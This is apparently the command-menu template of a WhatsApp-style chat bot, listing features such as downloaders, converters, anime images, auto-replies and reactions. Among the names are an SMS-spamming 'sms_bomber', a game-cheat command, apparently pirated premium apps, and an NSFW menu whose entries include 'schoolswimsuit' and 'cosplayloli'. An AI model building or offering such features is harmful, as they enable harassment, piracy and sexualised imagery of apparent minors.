┣◁️⚡💥 ${prefix}𝐬𝐬
┣◁️⚡💥 ${prefix}𝐜𝐨𝐮𝐩𝐥𝐞𝐩𝐩
┣◁️⚡💥 ${prefix}𝐞𝐧𝐜𝐫𝐲𝐩𝐭
┣◁️⚡💥 ${prefix}𝐥𝐚𝐧𝐠𝐮𝐚𝐠𝐞𝐬
┣◁️⚡💥 ${prefix}𝐜𝐫𝐢𝐝𝐢𝐭𝐬
┣◁️⚡💥 ${prefix}𝐬𝐮𝐩𝐩𝐨𝐫𝐭
┣◁️⚡💥 ${prefix}𝐫𝐞𝐩𝐨𝐬𝐭
┣◁️⚡💥 ${prefix}𝐯𝐯𝟐
┣◁️⚡💥 ${prefix}𝐭𝐢𝐤𝐭𝐨𝐤𝐬𝐞𝐚𝐫𝐜𝐡
┣◁️⚡💥 ${prefix}𝐦𝐨𝐯𝐢𝐞
┣◁️⚡💥 ${prefix}𝐯𝐨𝐥𝐯𝐢𝐝
┣◁️⚡💥 ${prefix}𝐫𝐞𝐦𝐢𝐧𝐢
┣◁️⚡💥 ${prefix}𝐮𝐩𝐬𝐜𝐚𝐥𝐞
┣◁️⚡💥 ${prefix}𝐡𝐝𝐯𝐢𝐝𝐞𝐨
┣◁️⚡💥 ${prefix}𝐤𝐝𝐫𝐚𝐦𝐚
┣◁️⚡💥 ${prefix}𝐜𝐡𝐚𝐧𝐧𝐞𝐥
┣◁️⚡💥 ${prefix}𝐟𝐥𝐢𝐩𝐭𝐞𝐱𝐭
┣◁️⚡💥 ${prefix}𝐬𝐩𝐚𝐦𝐬𝐦𝐬
┣◁️⚡💥 ${prefix}𝐰𝐞𝐚𝐭𝐡𝐞𝐫
┣◁️⚡💥 ${prefix}𝐦𝐨𝐝𝐚𝐩𝐤
┣◁️⚡💥 ${prefix}𝐭𝐞𝐫𝐚𝐛𝐨𝐱
┣◁️⚡💥 ${prefix}𝐭𝐢𝐧𝐲𝐮𝐫𝐥
┣◁️⚡💥 ${prefix}𝐬𝐡𝐨𝐫𝐭𝐮𝐫𝐥
┣◁️⚡💥 ${prefix}𝐜𝐮𝐭𝐭𝐥𝐲
┣◁️⚡💥 ${prefix}𝐛𝐢𝐭𝐥𝐲
┣◁️⚡💥 ${prefix}𝐬𝐨𝐮𝐧𝐝𝟏-𝐬𝐨𝐮𝐧𝐝𝟏𝟔𝟏
┣◁️⚡💥 ${prefix}𝐯𝐨𝐥𝐯𝐢𝐝
╰━━━━━━━━━━━━━━━━━━╯
${readmore}

╭⭑━━━➤ 𝐌𝐀𝐈𝐍 𝐌𝐄𝐍𝐔
┣◁️⚡💥 ${prefix}𝐦𝐞𝐧𝐮
┣◁️⚡💥 ${prefix}𝐛𝐮𝐲𝐩𝐫𝐞𝐦𝐢𝐮𝐦
┣◁️⚡💥 ${prefix}𝐫𝐮𝐧𝐭𝐢𝐦𝐞
┣◁️⚡💥 ${prefix}𝐬𝐜𝐫𝐢𝐩𝐭
┣◁️⚡💥 ${prefix}𝐝𝐨𝐧𝐚𝐭𝐞
┣◁️⚡💥 ${prefix}𝐨𝐰𝐧𝐞𝐫
┣◁️⚡💥 ${prefix}𝐩𝐢𝐧𝐠
╰━━━━━━━━━━━━━━━━━━╯
${readmore}

╭⭑━━━➤ 𝐎𝐖𝐍𝐄𝐑 𝐌𝐄𝐍𝐔
┣◁️⚡💥 ${prefix}𝐜𝐡𝐚𝐭𝐛𝐨𝐭 <𝐨𝐧/𝐨𝐟𝐟>
┣◁️⚡💥 ${prefix}𝐜𝐡𝐚𝐭𝐛𝐨𝐭𝐠𝐜 <𝐨𝐧/𝐨𝐟𝐟>
┣◁️⚡💥 ${prefix}𝐜𝐡𝐚𝐭𝐛𝐨𝐭𝐚𝐥𝐥 <𝐨𝐧/𝐨𝐟𝐟>
┣◁️⚡💥 ${prefix}𝐜𝐥𝐞𝐚𝐫𝐜𝐡𝐚𝐭
┣◁️⚡💥 ${prefix}𝐬𝐞𝐭𝐩𝐩
┣◁️⚡💥 ${prefix}𝐠𝐞𝐭𝐩𝐩
┣◁️⚡💥 ${prefix}𝐥𝐢𝐬𝐭𝐛𝐥𝐨𝐜𝐤
┣◁️⚡💥 ${prefix}𝐛𝐥𝐨𝐜𝐤
┣◁️⚡💥 ${prefix}𝐮𝐧𝐛𝐥𝐨𝐜𝐤
┣◁️⚡💥 ${prefix}𝐠𝐞𝐭𝐛𝐢𝐨
┣◁️⚡💥 ${prefix}𝐚𝐧𝐭𝐢𝐝𝐞𝐥𝐞𝐭𝐞
┣◁️⚡💥 ${prefix}𝐚𝐮𝐭𝐨𝐬𝐭𝐚𝐭𝐮𝐬𝐫𝐞𝐚𝐜𝐭 <𝐨𝐧/𝐨𝐟𝐟>
┣◁️⚡💥 ${prefix}𝐚𝐮𝐭𝐨𝐛𝐢𝐨 <𝐨𝐧/𝐨𝐟𝐟>
┣◁️⚡💥 ${prefix}𝐚𝐮𝐭𝐨𝐫𝐞𝐚𝐜𝐭 <𝐨𝐧/𝐨𝐟𝐟>
┣◁️⚡💥 ${prefix}𝐚𝐮𝐭𝐨𝐭𝐲𝐩𝐢𝐧𝐠 <𝐨𝐧/𝐨𝐟𝐟>
┣◁️⚡💥 ${prefix}𝐚𝐮𝐭𝐨𝐫𝐞𝐜𝐨𝐫𝐝𝐢𝐧𝐠 <𝐨𝐧/𝐨𝐟𝐟>
┣◁️⚡💥 ${prefix}𝐚𝐮𝐭𝐨𝐫𝐞𝐚𝐝 <𝐨𝐧/𝐨𝐟𝐟>
┣◁️⚡💥 ${prefix}𝐮𝐧𝐚𝐯𝐚𝐢𝐥𝐚𝐛𝐥𝐞
┣◁️⚡💥 ${prefix}𝐝𝐞𝐥𝐞𝐭𝐞
┣◁️⚡💥 ${prefix}𝐦𝐨𝐝𝐞
┣◁️⚡💥 ${prefix}𝐬𝐮𝐝𝐨
┣◁️⚡💥 ${prefix}𝐝𝐞𝐥𝐬𝐮𝐝𝐨
┣◁️⚡💥 ${prefix}𝐥𝐢𝐬𝐭𝐬𝐮𝐝𝐨
┣◁️⚡💥 ${prefix}$
┣◁️⚡💥 ${prefix}=>
┣◁️⚡💥 ${prefix}>
┣◁️⚡💥 ${prefix}𝐩𝐫𝐞𝐦𝐢𝐮𝐦
┣◁️⚡💥 ${prefix}𝐛𝐮𝐲𝐩𝐫𝐞𝐦𝐢𝐮𝐦
╰━━━━━━━━━━━━━━━━━━╯
${readmore}

╭⭑━━━➤ 𝐂𝐇𝐀𝐍𝐍𝐄𝐋 𝐌𝐄𝐍𝐔
┣◁️⚡💥 ${prefix}𝐠𝐞𝐭𝐧𝐞𝐰𝐬𝐥𝐞𝐭𝐭𝐞𝐫
┣◁️⚡💥 ${prefix}𝐜𝐫𝐞𝐚𝐭𝐞𝐜𝐡𝐚𝐧𝐧𝐞𝐥
┣◁️⚡💥 ${prefix}𝐫𝐞𝐦𝐨𝐯𝐞𝐩𝐢𝐜
┣◁️⚡💥 ${prefix}𝐮𝐩𝐝𝐚𝐭𝐞𝐝𝐞𝐬𝐜
┣◁️⚡💥 ${prefix}𝐮𝐩𝐝𝐚𝐭𝐞𝐧𝐢𝐦𝐞
┣◁️⚡💥 ${prefix}𝐮𝐩𝐝𝐚𝐭𝐞𝐩𝐢𝐜
┣◁️⚡💥 ${prefix}𝐦𝐮𝐭𝐞𝐧𝐞𝐰𝐬
┣◁️⚡💥 ${prefix}𝐮𝐧𝐦𝐭𝐞𝐧𝐞𝐰𝐬
┣◁️⚡💥 ${prefix}𝐟𝐨𝐥𝐥𝐨𝐤𝐜𝐡𝐚𝐧𝐧𝐞𝐥
┣◁️⚡💥 ${prefix}𝐮𝐧𝐟𝐨𝐥𝐥𝐨𝐰𝐜𝐡𝐚𝐧𝐧𝐞𝐥
┣◁️⚡💥 ${prefix}𝐝𝐞𝐥𝐞𝐭𝐞𝐜𝐡𝐚𝐧𝐧𝐞𝐥
╰━━━━━━━━━━━━━━━━━━╯
${readmore} 

╭⭑━━━➤ 𝐏𝐄𝐓 𝐌𝐄𝐍𝐔
┣◁️⚡💥 ${prefix}𝐛𝐮𝐲𝐩𝐞𝐭 <𝐧𝐮𝐦𝐛𝐞𝐫>
┣◁️⚡💥 ${prefix}𝐦𝐲𝐩𝐞𝐭
┣◁️⚡💥 ${prefix}𝐭𝐫𝐚𝐢𝐧 <𝐧𝐮𝐞𝐫>
┣◁️⚡💥 ${prefix}𝐛𝐚𝐭𝐭𝐥𝐞 @𝐮𝐬𝐞𝐫
╰━━━━━━━━━━━━━━━━━━╯
${readmore}

╭⭑━━━➤ 𝐋𝐄𝐕𝐄𝐋-𝐔𝐏 𝐌𝐄𝐍𝐔
┣◁️⚡💥 ${prefix}𝐥𝐞𝐯𝐞𝐥
┣◁️⚡💥 ${prefix}𝐥𝐞𝐯𝐞𝐥𝐮𝐩 <𝐨𝐧/𝐨𝐟𝐟>
┣◁️⚡💥 ${prefix}𝐥𝐞𝐚𝐝𝐞𝐫𝐛𝐨𝐚𝐫𝐝
╰━━━━━━━━━━━━━━━━━━╯
${readmore}

╭⭑━━━➤ 𝐄𝐃𝐈𝐓𝐎𝐑 𝐌𝐄𝐍𝐔
┣◁️⚡💥 ${prefix}𝐰𝐚𝐧𝐭𝐞𝐝
┣◁️⚡💥 ${prefix}𝐝𝐫𝐚𝐤𝐞
┣◁️⚡💥 ${prefix}𝐜𝐥𝐨𝐰𝐧
┣◁️⚡💥 ${prefix}𝐚𝐥𝐞𝐫𝐭
┣◁️⚡💥 ${prefix}𝐩𝐞𝐭𝐠𝐢𝐟
┣◁️⚡💥 ${prefix}𝐭𝐰𝐞𝐞𝐭
┣◁️⚡💥 ${prefix}𝐚𝐥𝐛𝐮𝐦
╰━━━━━━━━━━━━━━━━━━╯
${readmore}

╭⭑━━━➤ 𝐂𝐎𝐍𝐕𝐄𝐑𝐓 𝐌𝐄𝐍𝐔
┣◁️⚡💥 ${prefix}𝐬𝐭𝐢𝐜𝐤𝐞𝐫
┣◁️⚡💥 ${prefix}𝐬𝐦𝐞𝐦𝐞
┣◁️⚡💥 ${prefix}𝐭𝐚𝐤𝐞
┣◁️⚡💥 ${prefix}𝐭𝐨𝐢𝐦𝐚𝐠𝐞
┣◁️⚡💥 ${prefix}𝐭𝐨𝐯𝐢𝐝𝐞𝐨
┣◁️⚡💥 ${prefix}𝐭𝐨𝐚𝐮𝐝𝐢𝐨
┣◁️⚡💥 ${prefix}𝐭𝐨𝐦𝐩𝟑
┣◁️⚡💥 ${prefix}𝐭𝐨𝐯𝐧
┣◁️⚡💥 ${prefix}𝐭𝐨𝐠𝐢𝐟
┣◁️⚡💥 ${prefix}𝐭𝐨𝐪𝐫
┣◁️⚡💥 ${prefix}𝐭𝐨𝐯𝐢𝐞𝐰𝐨𝐧𝐜𝐞
┣◁️⚡💥 ${prefix}𝐟𝐥𝐢𝐩𝐭𝐞𝐱𝐭
┣◁️⚡💥 ${prefix}𝐞𝐦𝐨𝐣𝐢𝐦𝐢𝐞
┣◁️⚡💥 ${prefix}𝐭𝐞𝐱𝐭𝟐𝐬𝐩𝐞𝐞𝐜𝐡
┣◁️⚡💥 ${prefix}𝐭𝐞𝐱𝐭𝟐𝐩𝐝𝐟
┣◁️⚡💥 ${prefix}𝐫𝐞𝐚𝐝𝐯𝐢𝐞𝐰𝐨𝐧𝐜𝐞𝟐
┣◁️⚡💥 ${prefix}𝐯𝐯
┣◁️⚡💥 ${prefix}𝐯𝐯𝟐
╰━━━━━━━━━━━━━━━━━━╯
${readmore}

╭⭑━━━➤ 𝐂𝐑𝐘𝐏𝐓𝐎 𝐌𝐄𝐍𝐔
┣◁️⚡💥 ${prefix}𝐜𝐫𝐲𝐩𝐭𝐨-𝐩𝐫𝐢𝐜𝐞
┣◁️⚡💥 ${prefix}𝐭𝐨𝐩-𝐜𝐫𝐲𝐩𝐭𝐨
┣◁️⚡💥 ${prefix}𝐜𝐫𝐲𝐩𝐭𝐨-𝐢𝐧𝐝𝐞𝐱
┣◁️⚡💥 ${prefix}𝐜𝐫𝐲𝐩𝐭𝐨-𝐜𝐨𝐧𝐯𝐞𝐫𝐭
┣◁️⚡💥 ${prefix}𝐜𝐫𝐲𝐩𝐭𝐨-𝐧𝐞𝐰𝐬
╰━━━━━━━━━━━━━━━━━━╯
${readmore}

╭⭑━━━➤ 𝐓𝐄𝐌𝐏-𝐌𝐀𝐈𝐋 𝐌𝐄𝐍𝐔
┣◁️⚡💥 ${prefix}𝐭𝐞𝐦𝐩𝐦𝐚𝐢𝐥
┣◁️⚡💥 ${prefix}𝐭𝐞𝐦𝐩𝐦𝐚𝐢𝐥-𝐢𝐧𝐛𝐨𝐱
╰━━━━━━━━━━━━━━━━━━╯
${readmore}

╭⭑━━━➤ 𝐌𝐎𝐕𝐈𝐄 𝐃𝐎𝐖𝐍𝐋𝐎𝐀𝐃𝐄𝐑 𝐌𝐄𝐍𝐔
┣◁️⚡💥 ${prefix}𝐦𝐨𝐯𝐢𝐞
┣◁️⚡💥 ${prefix}𝐬𝐞𝐥𝐞𝐜𝐭𝐦𝐨𝐯𝐢𝐞 <𝐧𝐮𝐦𝐛𝐞𝐫>
┣◁️⚡💥 ${prefix}𝐝𝐥𝐦𝐨𝐯𝐢𝐞 <𝐧𝐮𝐦𝐛𝐞𝐫>
╰━━━━━━━━━━━━━━━━━━╯
${readmore}

╭⭑━━━➤ 𝐏𝐑𝐄𝐌𝐈𝐔𝐌 𝐌𝐄𝐍𝐔
┣◁️⚡💥 ${prefix}𝐟𝐟_𝐡𝐞𝐚𝐝𝐬𝐡𝐨𝐭
┣◁️⚡💥 ${prefix}𝐜𝐚𝐩𝐜𝐮𝐭
┣◁️⚡💥 ${prefix}𝐜𝐚𝐩𝐜𝐮𝐭𝟐
┣◁️⚡💥 ${prefix}𝐧𝐞𝐭𝐟𝐥𝐢𝐱
┣◁️⚡💥 ${prefix}𝐭𝐞𝐥𝐞𝐠𝐫𝐚𝐦
┣◁️⚡💥 ${prefix}𝐬𝐦𝐬_𝐛𝐨𝐦𝐛𝐞𝐫
┣◁️⚡💥 ${prefix}𝐫𝐞𝐦𝐢𝐧𝐢_𝐚𝐩𝐤
┣◁️⚡💥 ${prefix}𝐲𝐨𝐮𝐭𝐮𝐛𝐞_𝐚𝐩𝐤
┣◁️⚡💥 ${prefix}𝐩𝐫𝐢𝐦𝐞_𝐯𝐢𝐝𝐞𝐨
╰━━━━━━━━━━━━━━━━━━╯
${readmore}

╭⭑━━━➤ 𝐀𝐍𝐈𝐌𝐄 𝐌𝐄𝐍𝐔
┣◁️⚡💥 ${prefix}𝐛𝐥𝐮𝐞𝐚𝐫𝐜𝐡𝐢𝐯𝐞
┣◁️⚡💥 ${prefix}𝐚𝐧𝐢𝐦𝐞𝐜𝐡𝐚𝐫𝐚𝐜𝐭𝐞𝐫
┣◁️⚡💥 ${prefix}𝐰𝐚𝐢𝐟𝐮
┣◁️⚡💥 ${prefix}𝐪𝐮𝐨𝐭𝐞𝐬𝐚𝐧𝐢𝐦𝐞
┣◁️⚡💥 ${prefix}𝐤𝐢𝐫𝐲𝐮𝐮
┣◁️⚡💥 ${prefix}𝟗𝐚𝐧𝐢𝐦𝐞
┣◁️⚡💥 ${prefix}𝐰𝐞𝐛𝐭𝐨𝐨𝐧
┣◁️⚡💥 ${prefix}𝐚𝐤𝐢𝐫𝐚
┣◁️⚡💥 ${prefix}𝐚𝐤𝐢𝐲𝐚𝐦𝐚
┣◁️⚡💥 ${prefix}𝐚𝐧𝐢𝐦𝐞𝐬𝐞𝐚𝐫𝐜𝐡
┣◁️⚡💥 ${prefix}𝐚𝐧𝐢𝐦𝐞 𝐯𝐢𝐝𝐞𝐨
┣◁️⚡💥 ${prefix}𝐚𝐫𝐭
┣◁️⚡💥 ${prefix}𝐚𝐬𝐮𝐧𝐚
┣◁️⚡💥 ${prefix}𝐚𝐲𝐮𝐳𝐚𝐰𝐚
┣◁️⚡💥 ${prefix}𝐛𝐨𝐫𝐮𝐭𝐨
┣◁️⚡💥 ${prefix}𝐛𝐭𝐬
┣◁️⚡💥 ${prefix}𝐜𝐡𝐢𝐡𝐨
┣◁️⚡💥 ${prefix}𝐜𝐨𝐬𝐩𝐥𝐚𝐲
┣◁️⚡💥 ${prefix}𝐜𝐨𝐬𝐩𝐥𝐚𝐲𝐥𝐨𝐥𝐢
┣◁️⚡💥 ${prefix}𝐜𝐲𝐛𝐞𝐫
┣◁️⚡💥 ${prefix}𝐝𝐞𝐢𝐝𝐞𝐫𝐚
┣◁️⚡💥 ${prefix}𝐝𝐨𝐫𝐚𝐞𝐦𝐨𝐧𝐪
┣◁️⚡💥 ${prefix}𝐞𝐥𝐢𝐚𝐧𝐚
┣◁️⚡💥 ${prefix}𝐞𝐳𝐫𝐚
┣◁️⚡💥 ${prefix}𝐞𝐦𝐢𝐥𝐢𝐚
┣◁️⚡💥 ${prefix}𝐞𝐱𝐨
┣◁️⚡💥 ${prefix}𝐠𝐚𝐦𝐞𝐰𝐚𝐥𝐥𝐩𝐚𝐩𝐞𝐫
┣◁️⚡💥 ${prefix}𝐠𝐫𝐞𝐦𝐨𝐧𝐲
┣◁️⚡💥 ${prefix}𝐡𝐚𝐜𝐤𝐞𝐫
┣◁️⚡💥 ${prefix}𝐡𝐞𝐬𝐭𝐢𝐚
┣◁️⚡💥 ${prefix}𝐡𝐢𝐧𝐚𝐭𝐎
┣◁️⚡💥 ${prefix}𝐡𝐮𝐬𝐛𝐮
┣◁️⚡💥 ${prefix}𝐢𝐧𝐨𝐫𝐢
┣◁️⚡💥 ${prefix}𝐢𝐬𝐮𝐳𝐮
┣◁️⚡💥 ${prefix}𝐢𝐬𝐥𝐚𝐦𝐢𝐜
┣◁️⚡💥 ${prefix}𝐢𝐭𝐨𝐫𝐢
┣◁️⚡💥 ${prefix}𝐣𝐞𝐧𝐧𝐢𝐞
┣◁️⚡💥 ${prefix}𝐢𝐭𝐚𝐜𝐡𝐢
┣◁️⚡💥 ${prefix}𝐣𝐢𝐬𝐨
┣◁️⚡💥 ${prefix}𝐣𝐮𝐬𝐭𝐢𝐧𝐚
┣◁️⚡💥 ${prefix}𝐤𝐚𝐠𝐚
┣◁️⚡💥 ${prefix}𝐤𝐚𝐠𝐮𝐫𝐚
┣◁️⚡💥 ${prefix}𝐤𝐚𝐤𝐚𝐬𝐢𝐡
┣◁️⚡💥 ${prefix}𝐜𝐚𝐫𝐭𝐨𝐨𝐧
┣◁️⚡💥 ${prefix}𝐤𝐚𝐨𝐬𝐡𝐢
┣◁️⚡💥 ${prefix}𝐬𝐡𝐨𝐫𝐭𝐪𝐮𝐨𝐭𝐞
┣◁️⚡💥 ${prefix}𝐤𝐞𝐧𝐞𝐤𝐢
┣◁️⚡💥 ${prefix}𝐤𝐨𝐭𝐨𝐫𝐢
┣◁️⚡💥 ${prefix}𝐤𝐮𝐫𝐮𝐦𝐢
┣◁️⚡💥 ${prefix}𝐥𝐢𝐬𝐚
┣◁️⚡💥 ${prefix}𝐦𝐚𝐝𝐚𝐫𝐚
┣◁️⚡💥 ${prefix}𝐦𝐞𝐠𝐮𝐦𝐢𝐧
┣◁️⚡💥 ${prefix}𝐦𝐢𝐜𝐤𝐲
┣◁️⚡💥 ${prefix}𝐦𝐢𝐤𝐚𝐬𝐚
┣◁️⚡💥 ${prefix}𝐦𝐢𝐤𝐮
┣◁️⚡💥 ${prefix}𝐧𝐚𝐫𝐮𝐭𝐨
┣◁️⚡💥 ${prefix}𝐦𝐞𝐧𝐚𝐭𝐨
┣◁️⚡💥 ${prefix}𝐦𝐨𝐮𝐧𝐭𝐚𝐢𝐧
┣◁️⚡💥 ${prefix}𝐧𝐞𝐤𝐨
┣◁️⚡💥 ${prefix}𝐧𝐞𝐤𝐨𝐦𝐢𝐧𝐞
┣◁️⚡💥 ${prefix}𝐧𝐞𝐳𝐮𝐤𝐨
┣◁️⚡💥 ${prefix}𝐨𝐧𝐞𝐩𝐢𝐜𝐞
┣◁️⚡💥 ${prefix}𝐩𝐨𝐤𝐞𝐦𝐨𝐧
┣◁️⚡💥 ${prefix}𝐩𝐫𝐨𝐠𝐫𝐚𝐦𝐦𝐢𝐧𝐠
┣◁️⚡💥 ${prefix}𝐩𝐞𝐧𝐭𝐨𝐥
┣◁️⚡💥 ${prefix}𝐫𝐚𝐧𝐝𝐨𝐦𝐧𝐢𝐦𝐞
┣◁️⚡💥 ${prefix}𝐫𝐚𝐧𝐝𝐨𝐦𝐧𝐢𝐦𝐞𝟐
┣◁️⚡💥 ${prefix}𝐫𝐢𝐳𝐞
┣◁️⚡💥 ${prefix}𝐫𝐨𝐬𝐞
┣◁️⚡💥 ${prefix}𝐬𝐚𝐠𝐢𝐫𝐢
┣◁️⚡💥 ${prefix}𝐬𝐚𝐤𝐮𝐫𝐚
┣◁️⚡💥 ${prefix}𝐬𝐚𝐭𝐚𝐧𝐢𝐜
┣◁️⚡💥 ${prefix}𝐬𝐚𝐬𝐮𝐤𝐞
┣◁️⚡💥 ${prefix}𝐬𝐡𝐢𝐧𝐚𝐧
┣◁️⚡💥 ${prefix}𝐬𝐡𝐢𝐧𝐤𝐚
┣◁️⚡💥 ${prefix}𝐬𝐡𝐨𝐭𝐚
┣◁️⚡💥 ${prefix}𝐬𝐩𝐚𝐜𝐞
┣◁️⚡💥 ${prefix}𝐭𝐞𝐜𝐡𝐧𝐨𝐥𝐨𝐠𝐲
┣◁️⚡💥 ${prefix}𝐭𝐞𝐣𝐢𝐧𝐚
┣◁️⚡💥 ${prefix}𝐭𝐨𝐮𝐤𝐚𝐜𝐡𝐚𝐧
┣◁️⚡💥 ${prefix}𝐭𝐬𝐮𝐧𝐚𝐝𝐞
┣◁️⚡💥 ${prefix}𝐲𝐨𝐭𝐬𝐮𝐛𝐚
┣◁️⚡💥 ${prefix}𝐲𝐮𝐤𝐢
┣◁️⚡💥 ${prefix}𝐲𝐮𝐦𝐞𝐤𝐨
┣◁️⚡💥 ${prefix}𝐲𝐮𝐥𝐢𝐛𝐨𝐜𝐢𝐥
╰━━━━━━━━━━━━━━━━━━╯
${readmore}

╭⭑━━━➤ 𝐍𝐒𝐅𝐖 𝐌𝐄𝐍𝐔
┣◁️⚡💥 ${prefix}𝐠𝐞𝐧𝐬𝐡𝐢𝐧
┣◁️⚡💥 ${prefix}𝐬𝐰𝐢𝐦𝐬𝐮𝐢𝐭
┣◁️⚡💥 ${prefix}𝐬𝐜𝐡𝐨𝐨𝐥𝐬𝐰𝐢𝐦𝐬𝐮𝐢𝐭
┣◁️⚡💥 ${prefix}𝐰𝐡𝐢𝐭𝐞
┣◁️⚡💥 ${prefix}𝐛𝐚𝐫𝐞𝐟𝐨𝐨𝐭
┣◁️⚡💥 ${prefix}𝐭𝐨𝐮𝐡𝐨𝐮
┣◁️⚡💥 ${prefix}𝐠𝐚𝐦𝐞𝐜𝐠
┣◁️⚡💥 ${prefix}𝐡𝐨𝐥𝐨𝐥𝐢𝐯𝐞
┣◁️⚡💥 ${prefix}𝐮𝐧𝐜𝐞𝐧𝐬𝐨𝐫𝐞𝐝
┣◁️⚡💥 ${prefix}𝐬𝐮𝐧𝐠𝐥𝐚𝐬𝐬𝐞𝐬
┣◁️⚡💥 ${prefix}𝐠𝐥𝐚𝐬𝐬𝐞𝐬
┣◁️⚡💥 ${prefix}𝐰𝐞𝐚𝐩𝐨𝐧
┣◁️⚡💥 ${prefix}𝐬𝐡𝐢𝐫𝐭𝐥𝐢𝐟𝐭
┣◁️⚡💥 ${prefix}𝐜𝐡𝐚𝐢𝐧
┣◁️⚡💥 ${prefix}𝐟𝐢𝐧𝐠𝐞𝐫𝐢𝐧𝐠
┣◁️⚡💥 ${prefix}𝐟𝐥𝐚𝐭𝐜𝐡𝐞𝐬𝐭
┣◁️⚡💥 ${prefix}𝐭𝐨𝐫𝐧𝐜𝐥𝐨𝐭𝐡
┣◁️⚡💥 ${prefix}𝐛𝐨𝐧𝐝𝐚𝐠𝐞
┣◁️⚡💥 ${prefix}𝐝𝐞𝐦𝐨𝐧
┣◁️⚡💥 ${prefix}𝐩𝐚𝐧𝐭𝐲𝐩𝐮𝐥𝐥
┣◁️⚡💥 ${prefix}𝐡𝐞𝐚𝐝𝐩𝐡𝐨𝐧𝐞
┣◁️⚡💥 ${prefix}𝐡𝐞𝐚𝐝𝐝𝐫𝐞𝐬𝐬
┣◁️⚡💥 ${prefix}𝐚𝐧𝐮𝐬𝐯𝐢𝐞𝐰
┣◁️⚡💥 ${prefix}𝐬𝐡𝐨𝐫𝐭𝐬
┣◁️⚡💥 ${prefix}𝐬𝐭𝐨𝐤𝐢𝐧𝐠𝐬
┣◁️⚡💥 ${prefix}𝐭𝐨𝐩𝐥𝐞𝐬𝐬
┣◁️⚡💥 ${prefix}𝐛𝐞𝐚𝐜𝐡
┣◁️⚡💥 ${prefix}𝐛𝐮𝐧𝐧𝐲𝐠𝐢𝐫𝐥
┣◁️⚡💥 ${prefix}𝐛𝐮𝐞𝐧𝐧𝐲𝐞𝐚𝐫
┣◁️⚡💥 ${prefix}𝐯𝐚𝐦𝐩𝐢𝐫𝐞
┣◁️⚡💥 ${prefix}𝐛𝐢𝐤𝐢𝐧𝐢
┣◁️⚡💥 ${prefix}𝐧𝐨𝐛𝐫𝐚
┣◁️⚡💥 ${prefix}𝐰𝐡𝐢𝐭𝐞𝐡𝐚𝐢𝐫
┣◁️⚡💥 ${prefix}𝐛𝐥𝐨𝐧𝐝𝐞
┣◁️⚡💥 ${prefix}𝐩𝐢𝐧𝐤𝐡𝐚𝐢𝐫
┣◁️⚡💥 ${prefix}𝐛𝐞𝐝
┣◁️⚡💥 ${prefix}𝐩𝐨𝐧𝐲𝐭𝐚𝐢𝐥
┣◁️⚡💥 ${prefix}𝐧𝐮𝐝𝐞
┣◁️⚡💥 ${prefix}𝐝𝐫𝐞𝐬𝐬
┣◁️⚡💥 ${prefix}𝐮𝐧𝐝𝐞𝐫𝐰𝐞𝐚𝐫
┣◁️⚡💥 ${prefix}𝐮𝐧𝐢𝐟𝐨𝐫𝐦
┣◁️⚡💥 ${prefix}𝐟𝐨𝐱𝐠𝐢𝐫𝐥
┣◁️⚡💥 ${prefix}𝐬𝐤𝐢𝐫𝐭
┣◁️⚡💥 ${prefix}𝐛𝐫𝐞𝐚𝐬𝐭
┣◁️⚡💥 ${prefix}𝐭𝐰𝐢𝐧𝐭𝐚𝐢𝐥
┣◁️⚡💥 ${prefix}𝐬𝐩𝐫𝐞𝐚𝐝𝐩𝐮𝐬𝐬𝐲
┣◁️⚡💥 ${prefix}𝐬𝐞𝐞𝐭𝐡𝐫𝐨𝐮𝐠𝐡
┣◁️⚡💥 ${prefix}𝐛𝐫𝐞𝐚𝐬𝐭𝐡𝐨𝐥𝐝
┣◁️⚡💥 ${prefix}𝐟𝐚𝐭𝐞𝐬𝐞𝐫𝐢𝐞𝐬
┣◁️⚡💥 ${prefix}𝐬𝐩𝐫𝐞𝐚𝐝𝐥𝐞𝐠𝐬
┣◁️⚡💥 ${prefix}𝐨𝐩𝐞𝐧𝐬𝐡𝐢𝐫𝐭
┣◁️⚡💥 ${prefix}𝐡𝐞𝐚𝐝𝐛𝐚𝐧𝐝
┣◁️⚡💥 ${prefix}𝐧𝐢𝐩𝐩𝐥𝐞𝐬
┣◁️⚡💥 ${prefix}𝐞𝐫𝐞𝐜𝐭𝐧𝐢𝐩𝐩𝐥𝐞𝐬
┣◁️⚡💥 ${prefix}𝐠𝐫𝐞𝐞𝐧𝐡𝐚𝐢𝐫
┣◁️⚡💥 ${prefix}𝐰𝐨𝐥𝐟𝐠𝐢𝐫𝐥
╰━━━━━━━━━━━━━━━━━━╯
${readmore}

╭⭑━━━➤ 𝐀𝐔𝐓𝐎 𝐌𝐄𝐍𝐔
┣◁️⚡💥 ${prefix}𝐚𝐮𝐭𝐨𝐫𝐞𝐜𝐨𝐫𝐝 [𝐨𝐧/𝐨𝐟𝐟]
┣◁️⚡💥 ${prefix}𝐚𝐮𝐭𝐨𝐫𝐞𝐜𝐨𝐫𝐝𝐭𝐲𝐩 [𝐨𝐧/𝐨𝐟𝐟]
┣◁️⚡💥 ${prefix}𝐚𝐮𝐭𝐨𝐫𝐞𝐚𝐝 [𝐨𝐧/𝐨𝐟𝐟]
┣◁️⚡💥 ${prefix}𝐚𝐮𝐭𝐨𝐰𝐞𝐥𝐜𝐨𝐦𝐞 [𝐨𝐧/𝐨𝐟𝐟]
┣◁️⚡💥 ${prefix}𝐚𝐮𝐭𝐨𝐛𝐢𝐨 [𝐨𝐧/𝐨𝐟𝐟]
┣◁️⚡💥 ${prefix}𝐚𝐮𝐭𝐨𝐭𝐲𝐩𝐞 [𝐨𝐧/𝐨𝐟𝐟]
╰━━━━━━━━━━━━━━━━━━╯
${readmore}

╭⭑━━━➤ 𝐑𝐄𝐀𝐂𝐓𝐈𝐎𝐍𝐒 𝐌𝐄𝐍𝐔
┣◁️⚡💥 ${prefix}𝐤𝐢𝐥𝐥
┣◁️⚡💥 ${prefix}𝐩𝐚𝐭
┣◁️⚡💥 ${prefix}𝐥𝐢𝐜𝐤
┣◁️⚡💥 ${prefix}𝐛𝐢𝐭𝐞
┣◁️⚡💥 ${prefix}𝐲𝐞𝐞𝐭
┣◁️⚡💥 ${prefix}𝐛𝐨𝐧𝐤
┣◁️⚡💥 ${prefix}𝐰𝐢𝐧𝐤
┣◁️⚡💥 ${prefix}𝐩𝐨𝐤𝐞
┣◁️⚡💥 ${prefix}𝐧𝐨𝐦
┣◁️⚡💥 ${prefix}𝐬𝐥𝐚𝐩
┣◁️⚡💥 ${prefix}𝐬𝐦𝐢𝐥𝐞
┣◁️⚡💥 ${prefix}𝐰𝐚𝐯𝐞
